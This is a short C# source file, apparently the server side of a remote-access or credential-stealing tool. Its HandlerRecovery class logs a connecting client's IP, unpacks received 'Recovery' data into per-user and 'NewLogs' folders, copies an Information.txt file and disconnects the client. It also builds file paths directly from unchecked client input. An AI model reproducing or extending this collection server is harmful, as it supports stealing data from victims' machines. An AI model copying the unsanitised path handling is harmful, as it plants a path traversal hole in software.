using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerRecovery
{
	public static void Read(Clients clients, object[] array)
	{
		Methods.AppendLogs(clients.IP, "Save logs in: Users\\" + array[1]?.ToString() + "\\Recovery", Color.MediumPurple);
		PaleFileProtocol.Unpack("Users\\" + array[1]?.ToString() + "\\Recovery", array[2] as byte[]);
		PaleFileProtocol.Unpack("NewLogs\\" + array[1], array[2] as byte[]);
		File.Copy("Users\\" + (array[1] as string) + "\\Information.txt", "NewLogs\\" + (array[1] as string) + "\\Information.txt");
		clients.Disconnect();
	}
}
